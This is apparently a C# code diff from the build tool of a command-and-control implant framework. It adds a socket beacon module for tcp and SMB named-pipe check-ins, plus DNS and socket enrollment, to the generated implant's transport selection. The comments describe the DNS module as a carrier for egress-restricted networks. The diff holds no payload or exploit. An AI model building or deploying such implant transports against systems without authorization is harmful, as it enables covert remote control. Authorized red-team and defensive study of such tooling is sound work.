@@ -51,9 +51,18 @@ public enum CheckInModules
     /// <summary>
     /// The DNS check-in client (the implant's DnsCheckIn): serves walk
     /// entries whose beacon URL is dns-schemed -- the egress-restricted
-    /// TXT carrier, a poll cycle whatever the baked mode.
+    /// TXT carrier, poll-only (the parser refuses a stream-mode naming
+    /// with the fix, the same rule the socket family applies).
     /// </summary>
     Dns = 16,
+
+    /// <summary>
+    /// The socket check-in client (the implant's SocketBeacon): serves walk
+    /// entries whose beacon URL is tcp- or smb-schemed -- the named-pipe and
+    /// raw-socket poll carriers, one connection one check-in, the interactive
+    /// verbs on the shared store-and-forward carriage.
+    /// </summary>
+    Socket = 32,
 }
 
 /// <summary>
@@ -99,9 +108,14 @@ public static class CheckInModuleRegistry
             "        QuicCheckIn.Create(setup),"),
         new(
             CheckInModules.Dns,
-            ["Internal/DnsCheckIn.cs"],
+            ["Internal/DnsCheckIn.cs", "Internal/DnsEnroll.cs"],
             (url, _) => IsDnsBeaconUrl(url),
             "        DnsCheckIn.Create(setup),"),
+        new(
+            CheckInModules.Socket,
+            ["Internal/SocketCheckIn.cs", "Internal/SocketEnroll.cs"],
+            (url, _) => IsSocketBeaconUrl(url),
+            "        SocketCheckIn.Create(setup),"),
         new(
             CheckInModules.Stream,
             ["Internal/Beacon.cs", "Internal/StreamCheckIn.cs"],
@@ -117,6 +131,16 @@ public static class CheckInModuleRegistry
     // points the session at another front. The http(s) enroll client always
     // compiles, so no other enroll shape claims a module.
     public static bool EnrollsOverQuic(string enrollUrl) => IsQuicBeaconUrl(enrollUrl);
+
+    // The socket enroll exchange rides the socket module's dial the same
+    // way (Sec 8, enrollment over the stream check-in): a tcp- or
+    // smb-schemed enroll endpoint claims the module whatever the session's
+    // front names.
+    public static bool EnrollsOverSocket(string enrollUrl) => IsSocketBeaconUrl(enrollUrl);
+
+    // The DNS enroll exchange rides the DNS module's dial too (Sec 8,
+    // enrollment over DNS): a dns- or doh-schemed enroll endpoint claims it.
+    public static bool EnrollsOverDns(string enrollUrl) => IsDnsBeaconUrl(enrollUrl);
 
     // The implant's BeaconUrl.IsWeb, mirrored: a beacon URL naming a web
     // front (a schemed http(s) URL) carries the envelope POST cycle or the
@@ -142,6 +166,17 @@ public static class CheckInModuleRegistry
         var trimmed = beaconUrl.Trim();
         return trimmed.StartsWith("dns://", StringComparison.OrdinalIgnoreCase)
                || trimmed.StartsWith("doh://", StringComparison.OrdinalIgnoreCase);
+    }
+
+    // The implant's BeaconUrl.IsSocket, mirrored: a tcp-schemed beacon URL
+    // is the raw socket's dial, an smb-schemed one the named pipe's
+    // (smb://host/pipe/name). Kept in textual lockstep with the implant's
+    // predicate -- the wire-side test pins both.
+    private static bool IsSocketBeaconUrl(string beaconUrl)
+    {
+        var trimmed = beaconUrl.Trim();
+        return trimmed.StartsWith("tcp://", StringComparison.OrdinalIgnoreCase)
+               || trimmed.StartsWith("smb://", StringComparison.OrdinalIgnoreCase);
     }
 }
 
@@ -191,13 +226,9 @@ public static class TransportModuleSelection
         Consider(profile.BeaconEndpoint ?? DotNetBuildUnit.BeaconUrlFromEnroll(profile.Endpoint));
         foreach (var fallback in profile.FallbackEndpoints)
             Consider(DotNetBuildUnit.BeaconUrlFromEnroll(fallback));
-        if (CheckInModuleRegistry.EnrollsOverQuic(profile.Endpoint))
-            modules |= CheckInModules.Quic;
+        ClaimEnroll(profile.Endpoint);
         foreach (var fallback in profile.FallbackEndpoints)
-        {
-            if (CheckInModuleRegistry.EnrollsOverQuic(fallback))
-                modules |= CheckInModules.Quic;
-        }
+            ClaimEnroll(fallback);
         return modules;
 
         void Consider(string beaconUrl)
@@ -209,6 +240,19 @@ public static class TransportModuleSelection
                 modules |= descriptor.Module;
                 return;
             }
+        }
+
+        // The enroll entries claim a module when the exchange rides the
+        // module's own dial (QUIC, the socket family); the http(s) enroll
+        // client always compiles, so it claims nothing.
+        void ClaimEnroll(string enrollUrl)
+        {
+            if (CheckInModuleRegistry.EnrollsOverQuic(enrollUrl))
+                modules |= CheckInModules.Quic;
+            if (CheckInModuleRegistry.EnrollsOverSocket(enrollUrl))
+                modules |= CheckInModules.Socket;
+            if (CheckInModuleRegistry.EnrollsOverDns(enrollUrl))
+                modules |= CheckInModules.Dns;
         }
     }
 
@@ -255,20 +299,32 @@ public static class TransportModuleSelection
     // implant's Program hands this array to its check-in coordinator, which
     // picks per URL shape and mode at run time -- with one module compiled
     // the pick is constant, with several (a shape-crossing walk) it follows
-    // the walk exactly as the dev tree does. The enroll dispatch names the
-    // QUIC branch only when the module compiled -- the http branch (C2) is
-    // always compiled, so the member always exists for the Program to call.
+    // the walk exactly as the dev tree does. The enroll dispatch names a
+    // module's branch only when the module compiled -- the http branch (C2)
+    // is always compiled, so the member always exists for the Program to
+    // call.
     private static string RenderSelection(CheckInModules modules)
     {
         var factories = new List<string>();
         foreach (var descriptor in CheckInModuleRegistry.All)
             if ((modules & descriptor.Module) != 0)
                 factories.Add(descriptor.FactoryLine);
-        var enrollBranch = (modules & CheckInModules.Quic) != 0
-            ? "        BeaconUrl.IsQuic(dial.EnrollUrl)\n"
-              + "            ? await QuicEnroll.EnrollAsync(dial, cancellationToken)\n"
-              + "            : await C2.EnrollAsync(dial, cancellationToken);\n"
-            : "        await C2.EnrollAsync(dial, cancellationToken);\n";
+        var enrollChain = "await C2.EnrollAsync(dial, cancellationToken)";
+        if ((modules & CheckInModules.Dns) != 0)
+            enrollChain =
+                "BeaconUrl.IsDns(dial.EnrollUrl)\n"
+                + "                    ? await DnsEnroll.EnrollAsync(dial, cancellationToken)\n"
+                + "                    : " + enrollChain;
+        if ((modules & CheckInModules.Socket) != 0)
+            enrollChain =
+                "BeaconUrl.IsSocket(dial.EnrollUrl)\n"
+                + "                ? await SocketEnroll.EnrollAsync(dial, cancellationToken)\n"
+                + "                : " + enrollChain;
+        if ((modules & CheckInModules.Quic) != 0)
+            enrollChain =
+                "BeaconUrl.IsQuic(dial.EnrollUrl)\n"
+                + "            ? await QuicEnroll.EnrollAsync(dial, cancellationToken)\n"
+                + "            : " + enrollChain;
         return
             "// <auto-generated> Generated by Rod.DotNetBuildUnit at build time.\n"
             + "// The check-in modules this artifact compiles (architecture.md Sec 8),\n"
@@ -281,7 +337,7 @@ public static class TransportModuleSelection
             + string.Join("\n", factories) + "\n"
             + "    ];\n\n"
             + "    public static async Task<Enrollment> EnrollAsync(EnrollDial dial, CancellationToken cancellationToken = default) =>\n"
-            + enrollBranch
+            + "        " + enrollChain + ";\n"
             + "}\n";
     }
 }
